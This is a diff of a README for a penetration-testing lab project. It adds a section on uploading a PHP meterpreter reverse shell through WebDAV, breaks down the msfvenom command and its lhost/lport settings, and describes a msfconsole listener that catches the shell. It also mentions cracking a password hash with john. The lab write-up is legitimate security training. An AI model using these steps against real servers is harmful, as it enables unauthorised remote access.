@@ -132,4 +132,17 @@ Project demostrating my knowledge in defensive security, and pentration testing 
 
 - With the given hash and username associated with the hash we are easily able to crack the hash with `john` or by using crackstation.net.
 
-### 
+### Upload reverse shell to server
+
+- With access to WebDav we are able to add files remotely to the Web Server. We do this by creating a payload with `msfvenom` on our Kali machine and uploading them to the shared directory.
+
+- Msfvenom breakdown:
+   - `msfvenom` - command
+   - `-p php/meterpreter/reverse_tcp` - select payload
+   - `lhost=192.168.1.90` - set local host to kali machine
+   - `lport=4444` - set local port to 4444
+   - `>> shell.php` - output to shell.php
+
+- We now setup a listener with `msfconsole` so when the file is clicked on threw the website, the attacker is able to open a shell on the victim who clicked the shell.php file.
+
+# Blue Team
